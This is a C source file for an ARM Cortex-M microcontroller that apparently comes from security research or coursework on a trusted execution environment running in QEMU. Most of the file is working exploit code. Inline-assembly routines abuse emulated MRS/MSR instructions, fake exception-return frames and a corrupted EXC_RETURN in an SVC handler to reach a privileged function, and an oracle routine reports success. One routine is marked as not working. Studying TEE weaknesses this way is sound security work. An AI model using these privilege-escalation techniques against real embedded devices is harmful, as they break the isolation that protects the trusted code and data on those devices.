/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * Copyright (c) 2024 STMicroelectronics.
  * All rights reserved.
  *
  * This software is licensed under terms that can be found in the LICENSE file
  * in the root directory of this software component.
  * If no LICENSE file comes with this software, it is provided AS-IS.
  *
  ******************************************************************************
  */
/* Includes ------------------------------------------------------------------*/
#include "main.h"

/* Private includes ----------------------------------------------------------*/
#include "tee_client_api.h"
#include "stdbool.h"


/* Private typedef -----------------------------------------------------------*/


/* Private define ------------------------------------------------------------*/


/* Private macro -------------------------------------------------------------*/


/* Private variables ---------------------------------------------------------*/

extern int _estack;
extern void *__flash_boot_start__;

void (*EXC_RET_START)(void);

/* Private function prototypes -----------------------------------------------*/

void exploit_mrs(void);
void exploit_msr(void);
void exploit_exception_return(void);
void exploit_exception_handler(void);

void check_privileges(void);

/**
 * @brief   A function to communicate a result in a blind environment.
 *          Unfortunatly I didn't manage to setup the IO in QEMU.
 *          Crashes on fail and loops on success.
 * @param success Whether to loop (true) or crash (false).
 */
void binary_oracle(bool success);

/* Private user code ---------------------------------------------------------*/

int main(void) {

#if TEST_MRS_EXPLOIT
    exploit_mrs();
#elif TEST_MSR_EXPLOIT
    exploit_msr();
#elif TEST_EXCEPTION_HANDLER_EXPLOIT
    exploit_exception_handler();
#elif TEST_EXCEPTION_RETURN_EXPLOIT
    EXC_RET_START = (void*) 0x80f81c9;
    exploit_exception_return();
#else
    // Test that the privileged function doesn't succeed without privileges.
    check_privileges();
#endif

}



void exploit_mrs(void) {
    // NOTE: not working.

    // The TEE simulates MRS by directly executing the instruction and returning to the interrupt handler afterwards.
    // We can write lr with the address of the check_privileges function to change the control flow.
    // However to do that we need a special register to contain it.
    // I think the most suitable to contain an arbitrary address is PSP that is not used in this context (only for TA).
    // Unfortunally PSP's bits 0:1 are Should Be Zero or Preserved and therefore can't accomodate the thumb bit of the address.
    // However we are still able to modify the control flow.


    // Put the address of the privileged function in a suitable special register (PSP).
    __asm__(
        "ldr r0, =check_privileges\n"
        "msr psp, r0"
        : : : "r0"
    );

    // Overwrite the lr register to perform the arbitrary code execution after return.
    __asm__(
        "ldr r0, =0xe000e000\n"	// load SCB address
        "mrs lr, psp"
    );
}

void exploit_msr(void) {
    // The TEE simulates MRS by directly executing the instruction and returning to the interrupt handler afterwards.
    // We can write to the MSP in order to change the context and manipulate the stack.
    // In particular we want to put the address of check_privileges in correspondence of a value that will be pop to lr and branched.

    // Construct a fake frame that contains the privileged function address in the lr store position.
    int fake_frame[] = {0,0,0,0,0,0,0,0,0,0,(int)check_privileges};

    // Change the stack to control the flow.
    __asm__("msr msp, %[addr]" : : [addr] "r" (fake_frame));
}

__attribute__((naked))
void exploit_exception_return(void) {
    // This differs from exploit_exception_handler as we don't actually trigger exceptions.
    // We just abuse the exception return functionality by injecting a fake Exception_Catcher frame.
    __asm__(
        "ldr lr, =check_privileges\n"
        "push {r0, r1, r2, lr}\n"
        "ldr lr, =EXC_RET_START\n" // The address of EXC_RET_START
        "ldr lr, [lr]\n" // The address of EXC_RET_START
        "bx lr"
    );
}

void exploit_exception_handler(void) {
    // The exploit is actually in adversary_SVC_handler. Refer to it to see how the exploit works.
    // Here we just invoke the SVC handler.

    // Trigger a client SVC. Since the SVC deprivileging routine uses a similar approach to any other
    // interrupt, I have choosen SVC as it is easier to trigger.
    __asm__("svc 51");
}

__attribute__((naked))
void adversary_SVC_handler(void) {
    // Since we share the stack with the TEE and the TEE makes assumptions about it to remain uncorrupted
    // to work, we just... corrupt the stack like any buffer overflow.
    // The EXC_RETURN value is at sp+12:sp+15.

    // Overwrite the EXC_RETURN address with the privileged function address and return.
    __asm__ volatile (
        "ldr r0, =check_privileges\n"
        "str r0, [sp, #12]"
        : : : "r0"
    );
    // Even with independent stacks is still possible to change MSP and proceed as the exploit against MSR.
    // Even with checking that it is still a valid EXC_RETURN it could be altered to stay in handler mode.

    // Normal return.
    __asm__("bx lr");
}







void check_privileges(void) {
    // Try to access an address in FLASH_BOOT. This is not possible in unprivileged mode: MemFault.
    int* initial_tee_sp = *(int**) &__flash_boot_start__;

    // Check that the stack pointer of the TEE is the same of the SP of this CA (end of RAM).
    binary_oracle(initial_tee_sp == &_estack);
}

void binary_oracle(bool success) {
    // If successfull loop.
    if (success) {
        exit(0);
    }

    // Otherwise try to crash.
    __asm__ volatile (
        "and r0, #0\n"
        "ldr r0, [r0, #0]"
    );
}
